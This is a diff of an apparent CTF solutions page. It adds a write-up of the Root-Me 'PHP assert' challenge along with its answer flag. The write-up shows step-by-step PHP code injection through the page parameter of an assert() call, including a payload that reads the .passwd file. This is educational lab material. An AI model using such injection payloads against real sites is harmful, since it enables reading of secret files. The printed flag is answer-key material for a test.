@@ -2351,7 +2351,6 @@ PleaseUseAStrongSecretNextTime
 
 ---
 
-
 ## JWT Revoked token
 
 - Author: ArnC
@@ -2541,6 +2540,127 @@ Do_n0t_r3v0ke_3nc0d3dTokenz_Mam3ne-Us3_th3_JTI_f1eld
 
 ---	
 
+## PHP assert
+
+- Author: Birdy42
+- Date: 26 November 2016
+- Points: 25
+- Level: 3
+
+### Statement
+
+Find and exploit the vulnerability to read the file .passwd.
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch47/).
+
+### Resources
+
+1. [Exploiting LFI using co hosted web applications](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Exploiting%20LFI%20using%20co%20hosted%20web%20applications.pdf).
+2. [Source code auditing algorithm for detecting LFI and RFI](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Source%20code%20auditing%20algorithm%20for%20detecting%20LFI%20and%20RFI.pdf).
+3. [LFI with phpinfo() assistance](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20LFI%20with%20phpinfo()%20assistance.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can see the site source code:
+
+~~~html
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>Evilness is words to live by.</title>
+  </head>
+ <body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
+    <div>
+      <a href="?page=home">Home</a> |
+      <a href="?page=about">About</a> |
+      <a href="?page=contact">Contact</a>
+    </div>
+    <hr style="margin-bottom:30px;">
+    <div>
+      You will never find out where our secrets are located... ahahaha (Evil laugh)
+    </div>
+
+  </body>
+</html>
+~~~
+
+We can see the pages are referenced via php local files.  The available pages can be visited using the URLs:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch47/?page=home
+http://challenge01.root-me.org/web-serveur/ch47/?page=about
+http://challenge01.root-me.org/web-serveur/ch47/?page=contact
+~~~
+
+Trying the flag, we get an error:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch47/?page=.passwd
+
+'includes/.passwd.php'File does not exist
+~~~
+
+We can see the text input is appended with php to load the relevant page.  Trying to interfere with this we can insert an apostrophe:
+
+~~~
+http://challenge01.root-me.org/web-serveur/ch47/?page=contact%27
+
+Parse error: syntax error, unexpected T_CONSTANT_ENCAPSED_STRING in /challenge/web-serveur/ch47/index.php(8) : assert code on line 1 Catchable fatal error: assert(): Failure evaluating code: strpos('includes/contact'.php', '..') === false in /challenge/web-serveur/ch47/index.php on line 8 
+~~~
+
+This provides us with the syntax for the php redirect:
+
+~~~php
+strpos('includes/contact'.php', '..') === false
+~~~
+
+We can append a new command to see if this is injectable:
+
+~~~php
+http://challenge01.root-me.org/web-serveur/ch47/?page=contact','..') === false and print 'this is a test injection' and strpos('
+~~~
+
+This returns:
+
+~~~
+this is a test injection'includes/contact','..') === false and print 'this is a test injection' and strpos('.php'File does not exist
+~~~ 
+
+We can inject php into this to open and print the flag:
+
+~~~php
+http://challenge01.root-me.org/web-serveur/ch47/?page=contact','..') === false and print fread(fopen('.passwd','r'), filesize('.passwd')) and strpos('
+~~~
+
+And we find the password!
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+x4Ss3rT1nglSn0ts4f3A7A1Lx
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---	
+	
 Last updated Jan 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
